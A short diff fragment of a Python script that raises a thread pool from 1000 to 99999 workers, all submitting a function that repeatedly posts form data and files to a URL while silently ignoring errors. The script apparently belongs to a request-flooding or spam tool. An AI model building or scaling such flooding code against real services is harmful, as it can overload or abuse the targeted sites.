@@ -176,7 +176,7 @@ def bithika():
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
     except:pass
-with tred(max_workers=1000) as jjj:
+with tred(max_workers=99999) as jjj:
     jjj.submit(bithika)
 #----------http_canary-------#
 import requests
